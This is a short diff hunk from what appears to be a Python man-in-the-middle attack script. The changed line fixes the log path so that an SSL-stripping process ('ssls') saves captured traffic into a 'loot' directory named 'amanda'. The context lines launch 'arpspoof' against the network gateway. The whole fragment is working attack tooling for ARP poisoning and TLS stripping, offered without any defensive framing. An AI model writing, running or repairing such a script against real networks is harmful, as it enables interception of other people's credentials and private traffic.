@@ -34,7 +34,7 @@ if True:
   gate, iface = getifgate()
   setup(port)
   dr = makeloot('amanda')
-  ps['ssls']=x('terminator %s -e "ssls -k -l %d -w %s"' % (geo, port, dir+"ssls.log"))
+  ps['ssls']=x('terminator %s -e "ssls -k -l %d -w %s"' % (geo, port, dr+"ssls.log"))
   ps['arp']=x('terminator %s -e "arpspoof -i %s %s"' % (geo, iface, gate))
   i = input("> ")
   clean()
